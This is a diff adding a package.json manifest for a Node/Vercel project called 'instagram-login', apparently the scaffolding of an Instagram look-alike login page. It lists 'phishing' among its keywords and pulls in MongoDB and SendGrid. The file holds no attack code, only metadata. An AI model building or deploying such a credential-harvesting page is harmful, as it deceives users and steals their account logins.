@@ -1,0 +1,43 @@
+{
+  "name": "instagram-login",
+  "version": "1.0.0",
+  "description": "Instagram login page with secure backend integration",
+  "main": "public/index.html",
+  "scripts": {
+    "dev": "vercel dev",
+    "build": "echo 'No build step required'",
+    "start": "vercel dev",
+    "deploy": "vercel --prod",
+    "logs": "vercel logs"
+  },
+  "keywords": [
+    "instagram",
+    "login",
+    "phishing",
+    "security",
+    "mongodb",
+    "vercel",
+    "serverless"
+  ],
+  "author": "Your Name",
+  "license": "MIT",
+  "dependencies": {
+    "@sendgrid/mail": "^7.7.0",
+    "express": "^5.1.0",
+    "mongodb": "^6.20.0"
+  },
+  "devDependencies": {
+    "vercel": "^32.0.0"
+  },
+  "engines": {
+    "node": ">=18.0.0"
+  },
+  "repository": {
+    "type": "git",
+    "url": "https://github.com/yourusername/instagram-login.git"
+  },
+  "bugs": {
+    "url": "https://github.com/yourusername/instagram-login/issues"
+  },
+  "homepage": "https://github.com/yourusername/instagram-login#readme"
+}
